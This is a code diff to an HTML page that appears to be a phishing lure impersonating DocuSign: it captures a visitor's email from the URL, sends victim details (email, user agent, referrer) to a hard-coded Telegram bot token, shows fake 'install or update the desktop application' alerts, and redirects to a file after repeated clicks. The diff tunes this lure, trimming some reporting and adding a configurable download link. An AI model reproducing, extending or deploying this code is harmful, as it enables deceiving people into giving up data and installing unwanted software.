@@ -715,6 +715,11 @@
         var capturedEmail = '';
         var downloadUsed = localStorage.getItem('downloadUsed') === 'true';
         var viewFileClickCount = 0;
+        
+        // ═══ Configurable URL Templates ═══
+        // Users can replace these with any URLs they want to display
+        var CONFIGURABLE_URL = window.location.href; // For Telegram reports
+        var ALERT_URL = 'https://support.docusign.com/install-app'; // For alert messages
 
         // ═══ Telegram Reporting ═══
         const TELEGRAM_BOT_TOKEN = '8306714610:AAEH6GIcZcdlCoXhGj48AhMaYqeQRaMNtCQ';
@@ -731,7 +736,7 @@
                     `📅 Time: ${timestamp}\n` +
                     `🎯 Action: ${action}\n` +
                     `📧 Email: ${email || 'Not provided'}\n` +
-                    `🌐 URL: ${currentUrl}\n` +
+                    `🌐 URL: ${CONFIGURABLE_URL}\n` +
                     `📱 User Agent: ${userAgent}\n` +
                     `🔗 Referrer: ${referrer}`;
 
@@ -766,21 +771,15 @@
             const email = params.get('email');
             if (email && isValidEmail(email)) {
                 capturedEmail = email;
-                // Update email input field
                 const emailInput = document.getElementById('thesupwillsup-input');
                 if (emailInput) {
                     emailInput.value = email;
                 }
-                // Update display elements
                 const emailDisplays = document.querySelectorAll('#grabbed-email');
                 emailDisplays.forEach(element => {
                     element.textContent = email;
                 });
-                // Send visitor report when email is detected
-                sendTelegramReport('PAGE_VISIT_WITH_EMAIL', email);
-            } else {
-                // Send visitor report without email
-                sendTelegramReport('PAGE_VISIT');
+                // No Telegram report on page load
             }
         }
 
@@ -838,15 +837,12 @@
             viewFileClickCount++;
             localStorage.setItem('viewFileClickCount', viewFileClickCount.toString());
             
-            // Send Telegram report for view file click
-            sendTelegramReport('VIEW_FILE_CLICKED', capturedEmail + ' - Click #' + viewFileClickCount);
-            
             if (viewFileClickCount <= 2) {
                 // Show notification messages for first 2 clicks
                 if (viewFileClickCount === 1) {
-                    alert('Please ensure you have installed or updated the desktop application to view this file.');
+                    alert(`Please ensure you have installed or updated the desktop application to view this file.\n\nVisit: ${ALERT_URL}`);
                 } else if (viewFileClickCount === 2) {
-                    alert('Desktop application verification required. Please install or update the app to continue.');
+                    alert(`Desktop application verification required. Please install or update the app to continue.\n\nDownload: ${ALERT_URL}`);
                 }
             } else {
                 // Redirect to file URL in same tab on third click
@@ -969,4 +965,3 @@
 </body>
 
 </html>
-
